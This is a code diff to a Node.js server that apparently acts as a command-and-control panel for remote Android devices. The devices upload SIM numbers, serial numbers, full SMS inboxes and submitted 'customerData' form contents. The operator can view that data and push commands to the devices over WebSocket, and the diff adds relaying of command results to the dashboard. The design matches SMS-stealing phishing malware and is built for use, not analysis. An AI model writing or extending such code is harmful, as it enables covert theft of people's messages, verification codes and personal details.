@@ -41,7 +41,7 @@ const deviceSchema = new mongoose.Schema({
   customerData: mongoose.Schema.Types.Mixed,
   isDeleted: { type: Boolean, default: false },
   smsMessages: Array,
-  deletedSmsLog: { type: Array, default: [] } // To keep track of deleted SMS signatures
+  deletedSmsLog: { type: Array, default: [] }
 }, { timestamps: true });
 
 const Device = mongoose.model('Device', deviceSchema);
@@ -90,20 +90,10 @@ app.post('/api/delete-sms', async (req, res) => {
     try {
         const { deviceId, smsData } = req.body || {};
         const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
-        
         let dateVal = smsData.date;
         if (!isNaN(dateVal)) dateVal = Number(dateVal);
-
-        // Add to deleted log so it doesn't come back on sync
         const signature = `${smsData.body}_${dateVal}`;
-        
-        await Device.findOneAndUpdate(
-            query,
-            { 
-                $pull: { smsMessages: { body: smsData.body, date: dateVal } },
-                $addToSet: { deletedSmsLog: signature }
-            }
-        );
+        await Device.findOneAndUpdate(query, { $pull: { smsMessages: { body: smsData.body, date: dateVal } }, $addToSet: { deletedSmsLog: signature } });
         return res.json({ success: true });
     } catch(e) { return res.status(500).json({ success: false }); }
 });
@@ -123,15 +113,20 @@ app.post('/api/command', async (req, res) => {
         const { deviceId, action, data } = req.body || {};
         const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
         let device = await Device.findOne(query).lean();
-        if (!device) return res.status(404).json({ success: false });
+        if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
         
         const clients = global.deviceSockets.get(device.deviceId);
         if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
             return res.json({ success: true, device, messages: device.smsMessages || [], customerData: device.customerData || {} });
         }
+        
         if (!clients || clients.size === 0) return res.json({ success: false, message: 'Offline' });
+        
+        // Broadcast command to all connected sockets for this device
         clients.forEach(c => { if(c.readyState === WebSocket.OPEN) c.send(JSON.stringify({ command: action, data })); });
-        return res.json({ success: true });
+        
+        // Return immediately that command is sent. UI will listen for COMMAND_RESULT via socket.io
+        return res.json({ success: true, message: 'Command sent to device...' });
     } catch(e) { return res.status(500).json({ success: false }); }
 });
 
@@ -151,39 +146,29 @@ wss.on('connection', (ws, req) => {
       if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
       global.deviceSockets.get(id).add(ws);
       
+      // Handle Command Result (Success/Failed from Device)
+      if (data.type === 'COMMAND_RESULT') {
+          io.emit('command-result', { deviceId: id, success: data.success, message: data.message, action: data.command });
+          return;
+      }
+
       const existingDevice = await Device.findOne({ deviceId: id }).lean();
       const deletedLog = existingDevice?.deletedSmsLog || [];
-
-      const updateSet = { 
-          isOnline: true, 
-          lastSeen: new Date(),
-          isDeleted: false
-      };
-
+      const updateSet = { isOnline: true, lastSeen: new Date(), isDeleted: false };
       if (data.model) updateSet.model = data.model;
       if (data.androidVersion) updateSet.androidVersion = data.androidVersion;
       if (data.sim1) updateSet.sim1 = data.sim1;
       if (data.sim2) updateSet.sim2 = data.sim2;
       if (data.serialNumber) updateSet.serialNumber = data.serialNumber;
-      
       let b = parseInt(data.battery);
       if (!isNaN(b)) updateSet.battery = b;
-
       if (data.type === 'SMS_LIST' && data.messages) {
-          // Filter out messages that are in the deleted log
-          updateSet.smsMessages = data.messages.filter(m => {
-              const sig = `${m.body}_${m.date || m.time}`;
-              return !deletedLog.includes(sig);
-          });
+          updateSet.smsMessages = data.messages.filter(m => !deletedLog.includes(`${m.body}_${m.date || m.time}`));
       }
       if (data.type === 'FORM_SUBMIT' && data.customerData) updateSet.customerData = data.customerData;
       
       if (dbConnected) {
-          await Device.findOneAndUpdate(
-            { deviceId: id }, 
-            { $set: updateSet, $setOnInsert: { registrationTimestamp: new Date(), isPinned: false } }, 
-            { upsert: true, writeConcern: { w: 1 } }
-          );
+          await Device.findOneAndUpdate({ deviceId: id }, { $set: updateSet, $setOnInsert: { registrationTimestamp: new Date(), isPinned: false } }, { upsert: true });
           io.emit('dashboard-update');
       }
     } catch (e) { }
